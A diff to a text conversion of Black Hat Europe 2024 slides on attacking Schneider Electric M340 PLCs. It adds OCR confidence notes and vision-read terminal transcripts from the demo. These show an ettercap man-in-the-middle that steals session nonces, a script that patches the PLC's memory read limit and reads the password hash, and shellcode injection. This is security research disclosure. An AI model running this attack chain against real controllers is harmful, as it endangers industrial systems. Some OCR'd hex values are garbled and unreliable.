@@ -8,18 +8,25 @@ year: 2024
 source_pdf: "BlackHat_Europe_2024_slides/Amir Zaltzman & Avishai Wool_From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs.pdf"
 pages: 107
 sha256: "4471f928fdbb203353b8cbdc22845ad2e431a7eda5544c0e72b90284eb32a5ee"
-text_chars: 37589
-ocr_pages: 26
+text_chars: 33024
+ocr_pages: 19
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 89.5
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:48:45Z"
+converted_at: "2026-08-12T04:55:39Z"
 ---
 # From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs
 
 **Speakers:** Amir Zaltzman, Avishai Wool  
 **Conference:** Black Hat Europe 2024  
 **Source:** `BlackHat_Europe_2024_slides/Amir Zaltzman & Avishai Wool_From Pass-the-Hash to Code Execution on Schneider Electric M340 PLCs.pdf` (107 pages)
+
 
 ## Slide 1
 
@@ -29,12 +36,12 @@ Amir Zaltzman, Avishai Wool
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 EWROPE 20 >
 DECEMBER 11-12, 2024 | me »/ 2S
-4 =
 se From Pass-the-Hash to Code Execution
 on Schneider Electric M340 PLCs
 Amir Zaltzman, Avishai Wool
@@ -262,17 +269,6 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-EUROPE 2024
-* * KA syAcss MODS!
-a
-Project Password Hash Acquisition
-Information Classification: General
-```
-
 ## Slide 15
 
 #### **Project Password Hash**
@@ -307,18 +303,6 @@ Project password:
 Information Classification: General
 
 #BHEU @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-EUROPE 2024
-Project Password Registration
-Project password: *****
-ssai30jd uoljedi}UaYINY
-Information Classification: General
-```
 
 ## Slide 18
 
@@ -404,17 +388,6 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-EUROPE 2024
-Nonces Exchange
-ssai30jd uoljedi}UaYINY
-Information Classification: General
-```
-
 ## Slide 26
 
 # Authentication Secret Transmission
@@ -488,17 +461,6 @@ Information Classification: General
 Information Classification: General
 
 #BHEU @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-EUROPE 2024
-Authentication Process Finished
-ssai30jd uoljedi}UaYINY
-Information Classification: General
-```
 
 ## Slide 33
 
@@ -594,17 +556,6 @@ Information Classification: General
 Information Classification: General
 
 #BHEU @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-EUROPE 2024
-LUI rep
-Memory Access over UMAS
-Information Classification: General
-```
 
 ## Slide 39
 
@@ -863,17 +814,6 @@ Information Classification: General
 Information Classification: General
 
 #BHEU @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-EUROPE 2024
-MitM | Attack to Steal the Nonces
-ssaisoid T dais
-Information Classification: General
-```
 
 ## Slide 54
 
@@ -1223,17 +1163,6 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-EUROPE 2024
-Power on
-a:
-al
-Information Classification: General
-```
-
 ## Slide 80
 
 Information Classification: General
@@ -1246,11 +1175,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
 123.45.67.10/255.255.0.0
 Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use tempaddr is not set to 0.
@@ -1263,9 +1191,6 @@ Privileges dropped to EUID 65534 EGID 65534...
 2182 known services
 Lua: no scripts were specified, not starting up!
 Starting Bridged sniffing...
-Text only Interface activated...
-Hit 'h' for inline help
-Information Classification: General
 ```
 
 ## Slide 82
@@ -1274,12 +1199,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 a2 ae [ Start reserving PLC
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
 123.45.67.10/255.255.0.0
@@ -1293,9 +1216,6 @@ Privileges dropped to EUID 65534 EGID 65534...
 2182 known services
 Lua: no scripts were specified, not starting up!
 Starting Bridged sniffing...
-Text only Interface activated...
-Hit 'h' for inline help
-Information Classification: General
 ```
 
 ## Slide 83
@@ -1304,13 +1224,11 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
 black hat
-EUROPE 2024
-| wa PLC Application Password <BR !
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
 123.45.67.10/255.255.0.0
 Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use tempaddr is not set to 0.
@@ -1323,9 +1241,6 @@ Privileges dropped to EUID 65534 EGID 65534...
 2182 known services
 Lua: no scripts were specified, not starting up!
 Starting Bridged sniffing...
-Text only Interface activated...
-Hit 'h' for inline help
-Information Classification: General
 ```
 
 ## Slide 84
@@ -1334,15 +1249,12 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo
 Starting Bridged sniffing...
-Text only Interface activated...
-Hit 'h' for inline help
 Captured PC Diffie-Hellman public key message
 Dropped the message... .
 Sending attacker's Diffie-Hellman public key message to the PLC instead
@@ -1357,7 +1269,6 @@ Dropped the message...
 Sending attacker's response message to the PC
 Captured PC authentication request message
 Forwarded the message...
-Information Classification: General
 ```
 
 ## Slide 85
@@ -1366,19 +1277,15 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
 black hat
-EUROPE 2024
 Reserved session established Reserved
-(sade —
 amirz@ubuntu: ~/Documents/BlackHat_demo amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: -~/Documents/BlackHat_demo
 Starting Bridged sniffing...
 I
-Text only Interface activated...
-Hit 'h' for inline help
 Captured PC Diffie-Hellman public key message
 Dropped the message...
 Sending attacker's Diffie-Hellman public key message to the PLC instead
@@ -1393,7 +1300,6 @@ Dropped the message...
 Sending attacker's response message to the PC
 Captured PC authentication request message
 Forwarded the message...
-Information Classification: General
 ```
 
 ## Slide 86
@@ -1402,42 +1308,37 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 78/100 on the text kept, 52/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-EUROPE 2024
-J
-G
->
-J
-Information Classification: General
-amirz@ubunt uments/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amir
-5 6bc26d8048ac62894151c2dbefe184ec38e641513dcca4640260c461e7b261b3b3b6313375d23aat6b70b8bb97668T8
-db774f2322e0f £4cd333d7083da9a5dd150336ec986a85d9e81a9851c531c9163b8e29a044014036a78c83ccccaaf245
-3662e013a4736b2487 fbc826f6Ff fb52de3eccf6e8793bal0043da3bc674629decf5fb5cde7a8758163c6900a8745edal
-405c6891dd564f797b3d07 fa77d90b8e6119035b6b29a2da9Ff f12aflbbf50ed25af4154d5514d14cea70ad0d08ddb81b
-901e4e4e26d2a232222a474435a811F50d508d3d48ac03f8378",
-"plc shared": "c7f520477c53400be51db678c2128d0549bb4ca69d75cl1lce2al72elcb19eldcalaac1c7055d64
-07a7b81a81221f473e69b827c faceld734b9bf5e849a4309c33cccf5ecOd7d68cfdf218e917aafOf42589dd8c8c9Ff7c6
-63a0101ce588ddf62cdbbelf2b63da23e2241c6eae56912ee926c0 fF 8ddel98d807923dd5bf8Fc92455fO548c0af fc6fb
-5492f2071978e4620545595a0175baa7ce5386218b1a058dc82242c7758d0ab7al6b0b3b05cb6f feQaa0b98ed5d7d78c
-70cbde2159b1301bf cOd6df593c1d751f139 fO4db05a4ecdeO3ee7 cd9d7e7204F21a04df52025ce7 2e Fee
-ab42a3e560b747971102cc225efb07a225992e4951d9022Ff9b7",
-"aes pc": "bal0aaa9e18f428d9ab2fc717b779cd79ee70F edd679d3e6a33b0824ca600981", Steal the nonces
-"aes plc": "2d0761da402e0f547db7a935c62c79437b/0ed7e3b5417b15a65cac438698101",
-"pc nonce enc pc": "8effc35463bdad577867eb2102641c55dbd454c3897ab84e2 fbd61b5f47824ay =
-" ARFAFRATCRIAHAITOhRec208ccRedeQRkc"
-"pc nonce dec": "668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29",
-pe monce enc plc . PICSCHD LD4DT CSS TE4O04d Sd ZUUZ5U9 TS S504 dDdDS LOUZ9505e7T 1051 DS0909TO
-“fe28hellabh2ohhoeGefathalerhle fads tho fkac OhASP lab ai feahes”
-"e175ca0fa74105d654bc7 f43741e776737191bd4a023008a5d23da28d9cBefO"
-ubuntu: -/Do nts/BlackHat_demo amirz@ubuntu: -/Documents/BlackHat_demo x
-pL nance enc nich:
-"ple_ nonce dec":
-‘pre MOTICE Enc pe.
-“SUETUUSE dda T 17 CUGUUUSST COSCOUE 1407 COST USUZ4Z5ECUSS TT S7 dar eur 7.
-$f
+[Left panel — EcoStruxure Control Expert software window, left/top edge and right side obscured by illustration]
+...uxure Control Expert Cl...
+Ready          HMI R/W mode [green]  DIFFERENT [red]  STOP [yellow]
+
+[Right — photo of PLC module with Ethernet cable]
+
+[Terminal window, 4 tabs each labeled "amirz@ubuntu: ~/Documents/BlackHat_demo"]
+56bc26d8048ac62894f51c2dbefe184ec38e641513dcca4640260c461e7b261b3b3b6313375d23aaf6b70b8bb97668f8
+db774f2322e0ff4cd333d7083da9a5dd150336ec986a85d9e81a9851c531c9163b8e29a044014036a78c83ccccaaf245
+3662e013a4736b2487fbc826f6ffb52de3eccf6e8793ba10043da3bc674629decf5fb5cde7a8758163c6900a8745eda1
+405c6891dd564f797b3d07fa77d90b8e6119035b6b29a2da9ff12af1bbf50ed25af4154d5514d14cea70ad0d08ddb81b
+901e4e4e26d2a232222a474435a811f50d508d3d48ac03f8378",
+    "plc_shared": "c7f520477c53400be51db678c2128d0549bb4ca69d75c1ce2a172e1cb19e1dca1aac1c7055d64
+07a7b81a81221f473e69b827cface1d734b9bf5e849a4309c33cccf5ec0d7d68cfdf218e917aaf0f42589dd8c8c9f7c6
+63a0101ce588ddf62cdbbe1f2b63da23e2241c6eae56912ee926c0f8dde198d807923dd5bf8fc92455f0548c0affc6fb
+5492f2071978e4620545595a0175baa7ce5386218b1a058dc82242c7758d0ab7a16b0b3b05cb6ffe0aa0b98ed5d7d78c
+70cbde2159b1301bfc0d6df593c1d751f139f04db05a4ecde03ee7cd9d7e7204f21a04df52025ce72efb601c3ee5eb6c
+ab42a3e560b747971102cc225efb07a225992e4951d9022f9b7",
+    "aes_pc": "ba10aaa9e18f428d9ab2fc717b779cd79ee70fedd679d3e6a33b0824ca600981",   [speech bubble, character graphic:] Steal the nonces
+    "aes_plc": "2d0761da402e0f547db7a935c62c79437b70ed7e3b5417b15a65cac438698101",
+    "pc_nonce_enc_pc": "8effc35463bdad577867eb2102641c55dbd454c3897ab84e2fbd61b5f47824d9",
+    "pc_salt": "46f4f37c824be279b8cc295cc8ede98c"
+    [boxed in red:] "pc_nonce_dec": "668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fa129",
+    "pc_nonce_enc_plc": "f9c4cbb1b4bfc58fe46d4a3a2002509133b4abdb816029568ef1d3fb3696918
+    "plc_nonce_enc_plc": "fe38be12abb39b693e6efaf6a23e3b1ef9453f2169f5ec964581ab197feab[obscured by character graphic]
+    [boxed in red:] "plc_nonce_dec": "e175ca0fa74105d654bc7f43741e776737f191bd4a023008a5d23da28d9c8ef0"
+}amirz@ubuntu:~/Documents/BlackHat_demo$
 ```
 
 ## Slide 87
@@ -1446,23 +1347,22 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-EUROPE 2024
-s/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documen
-ab42a3e560074 971102¢c225efb07a225992e495 1490227967",
-"aes pc": "balOaaa9e18428d9ab2fc717b779cd79ee70fedd679d3e6a33b0824ca600981",
-"aes plc": "2d0761da402e0f547db7a935c62c79437b70ed7e3b5417b15a65cac438698101",
-"pc nonce enc pc": "8effc35463bdad577867eb2102641c55dbd454c3897ab84e2 fbd61b5f47824d9",
-"pc salt": "46f4f37c824be279b8cc295cc8ede98c",
-"pc nonce dec": "668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29",
-"pc nonce enc plc": "f9c4cbb1b4bfc58fe46d4a3a2002509133b4abdb816029568ef 1d3fb36969f8e" ,
-"plc_nonce enc plc": "fe38bel2abb39b693e6e faf6a23e3blef9453F2169f5ec964581ab197feabelc",
-"plc_nonce dec": "el75ca0fa74105d654bc7f43741e776737F191bd4a023008a5d23da28d9c8efO",
-"plc nonce enc pc": "“edef008ea8aal17cdaddd59fc83c60a1l4b7c69F09c2425ecb93 1 f 2
-} ub : $ python3 umas_read_limit_patch.py
+[Terminal window, 4 tabs each labeled "amirz@ubuntu: ~/Documents/BlackHat_demo"]
+ab42a3e560b747971102cc225efb07a225992e4951d9022f9b7",
+    "aes_pc": "ba10aaa9e18f428d9ab2fc717b779cd79ee70fedd679d3e6a33b0824ca600981",
+    "aes_plc": "2d0761da402e0f547db7a935c62c79437b70ed7e3b5417b15a65cac438698101",
+    "pc_nonce_enc_pc": "8effc35463bdad577867eb2102641c55dbd454c3897ab84e2fbd61b5f47824d9",
+    "pc_salt": "46f4f37c824be279b8cc295cc8ede98c",
+    "pc_nonce_dec": "668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fa129",
+    "pc_nonce_enc_plc": "f9c4cbb1b4bfc58fe46d4a3a2002509133b4abdb816029568ef1d3fb36969f8e",
+    "plc_nonce_enc_plc": "fe38be12abb39b693e6efaf6a23e3b1ef9453f2169f5ec964581ab197feabe1c",
+    "plc_nonce_dec": "e175ca0fa74105d654bc7f43741e776737f191bd4a023008a5d23da28d9c8ef0",
+    "plc_nonce_enc_pc": "edef008ea8aa117cdaddd59fc83c60a14b7c69f09c2425ecb931f37aafec1f7c"
+}amirz@ubuntu:~/Documents/BlackHat_demo$ python3 umas_read_limit_patch.py
 Connected to PLC at 123.45.67.89
 Checking if PLC address read limit is patched...
 PLC address read limit is NOT patched
@@ -1472,7 +1372,8 @@ PLC session is reserved:
 Resever name: DESKTOP-TL4SLLV
 Resever ID: 0xA3320000
 Insert session key:
-Information Classification: General
+
+[speech bubble, character graphic:] Modify read-access limit
 ```
 
 ## Slide 88
@@ -1481,11 +1382,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 amirz@ubuntu:~/Documents/BlackHat_demo x amirz@ubuntu;: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
 Do you want to patch it? [Y/n] Y
 Checking PLC session status...
@@ -1497,7 +1397,6 @@ Insert session key:
 Insert PC nonce:
 668c6dc01c698 fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29
 Insert PLC nonce:
-e175ca0fa74105d654bc7 £43741e7 76737 F191bd4a023008a5d23da28d9c8efO
 Getting PLC ID...
 PLC ID: 06010301
 Patching PLC...
@@ -1507,7 +1406,6 @@ Choose an option:
 2) Read project hashed password
 3) Read memory data manually
 QO) Exit
-Information Classification: General
 ```
 
 ## Slide 89
@@ -1516,26 +1414,20 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
 black hat
-EUROPE 2024
 Unreserve Unreserved
 They
-5)
-basal
 amirz@ubuntu:~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x
 PLC session is reserved:
 Resever name: DESKTOP-TL4SLLV
 Resever ID: 0xA3320000
 Insert session key:
-9e
 Insert PC nonce:
-668c6dc01c698fb6b2b706d9b91b1889731044076c36f636e395bc2e743fal29
 Insert PLC nonce:
-e175ca0fa74105d654bc7f43741e776737F191bd4a023008a5d23da28d9c8e>fO
 Getting PLC ID...
 PLC ID: 06010301
 Patching PLC...
@@ -1547,7 +1439,6 @@ Choose an option:
 0) Exit
 0
 Bye
-Information Classification: General
 ```
 
 ## Slide 90
@@ -1556,15 +1447,12 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
-Information Classification: General
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x
 Bye
-: ¢$ python3 umas_ read limit _patch.py
 Connected to PLC at 123.45.67.89
 Checking if PLC address read limit is patched...
 PLC address read limit is patched :)
@@ -1575,8 +1463,6 @@ Choose an option:
 0) Exit
 2
 Proiect nassword hash (hase 64):
-FNMEG6SpcMqpoEGX6rb/WePOVOuZVacYXENRMdaZe58=
-RMuusoc ait VUptivil.
 1) Read reserved session hashed nonces
 2) Read project hashed password
 3) Read memory data manually
@@ -1591,14 +1477,11 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
-Text only Interface activated...
-Hit 'h' for inline help
 Captured PC Diffie-Hellman public key message
 Dropped the message...
 Sending attacker's Diffie-Hellman public key message to the PLC instead
@@ -1615,8 +1498,6 @@ Captured PC authentication request message _—_
 Forwarded the message...
 [40]+ Stopped sudo ettercap -T -i enx9cebe81llec58 -B enx207bd2b3ad0e Gi:
 are/ettercap/mitm filter BH demo.ef -q
-$f
-Information Classification: General
 ```
 
 ## Slide 92
@@ -1625,12 +1506,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
-Information Classification: General
 /Documents/BlackHat_demo amirz@ubuntu: ~/Documents
 Connected to PLC at 123.45.67.89
 Checking PLC session status...
@@ -1638,7 +1517,6 @@ PLC session is not reserved
 Establish reservation:
 Read memory block...
 Project application salt (base 64):
-5WeRS1Ld0M1c=
 Send PC Diffie-Hellman public key...
 Received PLC Diffie-Hellman public key
 /BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
@@ -1655,12 +1533,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-QQ
-black hat
-EUROPE 2024
 Reserved
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~-/Documents/BlackHat_demo
 Send PC Diffie-Hellman public key...
@@ -1668,16 +1544,11 @@ Received PLC Diffie-Hellman public key
 Send encrypted PC nonce and AES salt...
 Received encrypted PLC nonce
 Insert project password hash (base 64):
-FNMEG6SpcMqpoEGX6rb7WePOVOuZVacYXENRMdaZe58=
 Send authentication secret...
 Reservation established successfully!
 Reservation parameters:
-4141414141414141414141414141414141414141414141414141414141414141
-“y, nee63T1141e9ecb5c39e9ec813166177b8769a6323652aT0b7bb49127 F9et f5d
-cp eSecsron Key.
 jab
 < Sending reserved 'GetPlcStatus' messages to keep the reserved session alive...
-Information Classification: General
 ```
 
 ## Slide 94
@@ -1686,11 +1557,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: -/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x
 $ python3 umas shellcode BH demo.py --shellcode shellcode |
 sdCardLed BH demo.bin
@@ -1700,7 +1570,6 @@ Choose an option:
 1) Inject shellcode and patch the secondary pointer (reserved session is required)
 2) Trigger the shellcode (using public UMAS message)
 ©) Exit
-Information Classification: General
 ```
 
 ## Slide 95
@@ -1709,11 +1578,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 amirz@ubuntu: ~/Docume Blac amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu:~/Documents/BlackHat_demo x
 Choose an opt :
 pl) Inject shellcode and patch the secondary pointer (reserved session is required)
@@ -1727,13 +1595,11 @@ Resever ID: 0x12345678
 Insert session key:
 4141414141414141414141414141414141414141414141414141414141414141
 Insert PLC nonce:
-aee63f1141e9ecb5c39e9ec8 F3f66F77b8769a6323652af0b7bb49127 F9ef F5d
 Getting PLC ID...
 PLC ID: 06010301
 Injecting shellcode 'shellcode sdCardLed BH demo.bin' to safe storage memory area...
 Shellcode injected successfully :)
 Patching the secondary function pointer to the shellcode address
-Information Classification: General
 ```
 
 ## Slide 96
@@ -1742,28 +1608,23 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-QQ
 black hat
-EUROPE 2024
 a sha Unreserved
 amirz@ubuntu: ~/Documents/BlackHat_demo amirz@ubuntu: -/Documents/BlackHat_demo amirz@ubuntu: ~/Documents/BlackHat_demo x neha ta ments/BlackHat_demo x
 Send encrypted PC nonce and AES salt...
 Received encrypted PLC nonce
 Insert project password hash (base 64):
-NMEG6SpcMqpoEGX6rb7WePOVOuZVacYXENRMdaZe58=
 Send authentication secret...
 Reservation established successfully!
 Reservation parameters:
 4141414141414141414141414141414141414141414141414141414141414141
 PLC nonce:
-aee63f1141e9ecb5c39e9ec8F3 f66F77b8769a6323652afOb7/bb49127 f9ef f5d
 Sending reserved 'GetPlcStatus' messages to keep the reserved session alive...
-we
 [5]+ Stopped python3 umas_reserve.py
-Information Classification: General
 ```
 
 ## Slide 97
@@ -1772,13 +1633,11 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x amirz@ubuntu: ~/Documents/BlackHat_demo x Soo la sca x
->
 Checking PLC session status...
 PLC session is reserved:
 Resever name: ATTACKER PC
@@ -1788,7 +1647,6 @@ ab
 Insert PC nonce:
 4141414141414141414141414141414141414141414141414141414141414141
 Insert PLC nonce:
-aee63f1141e9ecb5c39e9ec8 f3 f66f77b8769a6323652af Ob7bb49127 f9ef f5d
 Getting PLC ID... .
 PLC ID: 06010301 | Trigger our shellcode
 Injecting shellcode 'shellcode sdCardLed BH demo.bin' to safe storage memory ar
@@ -1798,9 +1656,7 @@ Secondary pointer patched successfully :) y
 Choose an option:
 1) Inject shellcode and patch the secondary pointer (reserved session is required)
 2) Trigger the shellcode (using public UMAS message) \wip-
-0) Exit Snes
 2
-Information Classification: General
 ```
 
 ## Slide 98
@@ -1898,11 +1754,10 @@ Information Classification: General
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 Amir Zaltzman
 + Embedded security researcher
 Motivation
@@ -1915,9 +1770,7 @@ proprietary security protocols while ensuring
 operational compatibility.
 - black hat DECEMBER 9-12,.2024
 EUROPE 2024 e UNITED 4
-FeATURES BUSINESS HALL ‘sPonsons:
 Talk materials will be available online
-Information Classification: General
 ```
 
 ## Slide 107
